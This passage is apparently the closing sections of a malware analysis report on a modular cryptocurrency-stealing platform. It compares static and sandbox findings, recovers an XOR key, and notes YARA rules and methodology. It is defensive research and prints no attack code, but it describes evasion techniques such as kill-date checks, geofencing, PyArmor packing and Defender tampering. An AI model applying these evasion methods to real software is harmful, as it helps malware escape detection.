against build 2 exactly as predicted in §7.3. `XORTOR_XORed_PE_KeyAgnostic`
was written in response, keying on the invariant relationship between the
plaintext PE header and its NUL padding rather than on key material. It
matched all three builds under three different keys.

The JScript and C2-fragment rules survived rotation because they key on
function names and the reused `ffeasxsfee` fragment — but the wallet and C2
changes between builds 1 and 2 show these will eventually degrade. The
structural rules carry the durable value.

---

## 10. Static versus dynamic analysis

Build 2 was submitted to CAPE Sandbox (analysis 75711, 241 seconds, Windows 10 KVM).

### Confirmed by dynamic analysis

- **`Packer: PyInstaller [overlay; modified]`** — independent confirmation of
  the recompiled bootloader identified statically in §8
- **Build fingerprint:** MSVC 2022 v17.6, linker 14.36.35225. This is a
  toolchain indicator the static analysis could not produce, and it may link
  future samples to the same build environment.
- Script host execution, consistent with the JScript modules

### Added by dynamic analysis

- **Windows Defender modification via PowerShell** (T1562.001) — not visible
  in the static analysis
- Kill-date check, locale query (geofencing), volume serial fingerprinting
- Anomalous file deletion (10+), consistent with post-execution cleanup

### Missed by dynamic analysis

The Network, Dropped Files, Registry and Process Tree sections of the sandbox
report were all **empty**. The report itself explains why: the sample
*"exits too soon after checking local time"*. The payload never executed.

Consequently none of the following appear in the sandbox report, all of which
were recovered statically:

- both `.onion` C2 addresses
- the XOR key
- the five wallet families and the 40k-address substitution pool
- the XML-RPC multicall template and WordPress enumeration logic
- the PowerShell screen-capture routine
- the BIP-39 seed-phrase harvesting logic

### Interpretation

Several dynamic signatures read as shellcode — `Creates RWX memory`,
`manually resolves API addresses from unbacked memory`, self-modifying code,
VEH registration, guard pages. These are consistent with **PyArmor's runtime**,
which was identified statically. Without that context an analyst would likely
report them as process injection.

Dynamic analysis reports what happened in one run. Static analysis reports
what the sample can do. Against a sample with environmental checks, the former
returns very little — and in this case returned almost nothing.

Both were needed. The sandbox supplied the Defender tampering and the build
fingerprint; static analysis supplied everything else, and supplied the context
required to interpret the sandbox output correctly.

---

## 11. Assessment

This is not a single malware family. It is a **modular platform** with independent monetisation paths sharing common infrastructure — bot identity, task queue, result store, Tor transport. The `pack.js` template with its `%D%`/`%P%` placeholders indicated a builder. Analysis of two further builds (§9) confirmed it: keys rotate every build, wallets and C2 rotate periodically, and the dropper is otherwise byte-identical.

The operator's engineering is asymmetric. The evasion chain is genuinely layered — a recompiled bootloader is a deliberate, non-trivial step that most commodity droppers skip. Yet the payload encryption is repeating-XOR, chosen apparently on the assumption that PyArmor hides the key.

PyArmor hides the key. It does not hide the **pattern** — and in a repeating-XOR construction the pattern *is* the key. Four layers of obfuscation fell to Hamming distance and byte frequency: techniques that predate the malware by roughly a century.

All three samples were analysed statically, on an ARM host, without ever executing them. The only dynamic data used came from a third-party sandbox run (§10), which the sample largely defeated.

---

## 12. Methodology notes

Static-only, on Apple Silicon (ARM64) — the x86 payload cannot execute on this host, which is itself a safety property.

### Reproducibility — added 2026-08-19

External review noted that this report's central claim — key recovery from
ciphertext alone — was **not reproducible** as published: the Hamming distance
scan appeared as four hand-picked rows from an unstated range, and the recovery
code was a 15-line excerpt.

[`scripts/xortor_xor_keyrecover.py`](../scripts/xortor_xor_keyrecover.py) now
implements both steps end to end and prints the **full** scan rather than a
selection:

```
python3 scripts/xortor_xor_keyrecover.py data_p002/uusd.exe
python3 scripts/xortor_xor_keyrecover.py data_p002/uusd.exe --decrypt uusd_plain.exe
```

Expected on build 1: key length 12, key `tgn5AIyxKkQi`, plaintext beginning
`4D 5A`.

**Still not reproducible:** the tool table below carries no versions, and no
exact invocations are recorded. The CAPE analysis referenced in §10 is cited by
ID only — no URL, no exported JSON — so that third-party evidence cannot be
independently checked either.

| Tool | Use |
|---|---|
| `pefile` | PE parsing, section entropy, imports, overlay calculation |
| `pyinstxtractor-ng` | PyInstaller container extraction |
| `7zz` | AES-encrypted ZIP handling (macOS `unzip` lacks AES support) |
| `strings`, `xxd` | Triage |
| Python | Frequency analysis, Hamming distance, key recovery, bulk decryption |
| `yara` | Rule development and testing |
| `shasum`, `diff` | Cross-build comparison |
| CAPE Sandbox | Third-party dynamic analysis (build 2) |

**Operational note.** Running Python from inside the extracted sample directory caused an import error: the interpreter resolved the sample's `struct.pyc` (Python 3.13 bytecode) instead of the standard library module. Harmless here, but the same mechanism is a code-execution vector in a Python-based sample. **Never execute an interpreter with a malware directory as the working directory.**
